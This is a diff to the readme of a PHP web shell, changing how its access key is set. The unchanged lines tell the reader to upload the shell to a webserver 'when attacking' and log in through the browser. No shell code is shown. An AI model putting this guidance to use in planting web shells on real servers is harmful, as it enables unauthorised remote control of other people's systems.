@@ -19,7 +19,7 @@ V1.0.6 is the newest update for now, I'll hope you enjoy.<br><br>Functions:<br>
 - rename the file to whatever you want, links will adjust automatically.
 </p><p align="left">
 Installation:<br> 
-Set the <ins>$access_key</ins> variable to your own password(that's more secure).
+The <ins>$access_key</ins> Has an hashed string(Future update for password changing).
 For using the command line interface set <ins>$password</ins> to your own.<br>
 When attacking with this shell on a webserver, upload it, go to the file, login
 & everything will be fine. (Make sure you use Mozilla browser, otherwise it blocks
